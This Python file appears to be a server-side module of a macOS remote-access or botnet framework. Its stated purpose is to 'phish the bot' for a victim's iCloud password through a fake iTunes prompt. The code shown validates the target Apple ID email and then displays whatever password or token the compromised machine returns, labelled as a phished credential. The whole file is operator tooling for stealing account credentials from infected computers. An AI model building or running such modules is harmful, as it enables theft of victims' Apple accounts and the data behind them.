# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

import re

from server.modules.helper import *

EMAIL_RE = re.compile(r"^[^\s@]+@[^\s@]+\.[^\s@]+$")


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Phish the bot for their iCloud password via iTunes.",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Apple/iCloud email address to phish (must be a valid email): "
        ]

    def setup(self, set_options):
        email = (set_options[0] or "").strip()

        if not email:
            self._view.display_error("No email address was provided.")
            return False, None

        if not re.match(EMAIL_RE, email):
            self._view.display_error(
                "Invalid email address '{}'. Expected a valid format like user@example.com.".format(email)
            )
            return False, None

        return True, {
            "email": email
        }

    def process_response(self, response, response_options):
        response_options = response_options or {}
        email = response_options.get("email") or "the target"

        str_response = ""
        if isinstance(response, bytes):
            str_response = response.decode("utf-8", errors="replace")
        else:
            str_response = str(response)

        self._view.output_separator()

        stripped = str_response.strip()
        if not stripped:
            self._view.output("No phishing result was returned for {}.".format(email), "info")
            return

        lowered = stripped.lower()

        if any(token in lowered for token in ("denied", "canceled", "cancelled", "failed", "error", "timeout")):
            self._view.output("The phishing attempt did not yield a password.", "attention")
            self._view.output(stripped)
            return

        # Anything else returned is treated as the phished result (password/token).
        self._view.output("Phished credential for {}:".format(email), "info")
        self._view.output(stripped)
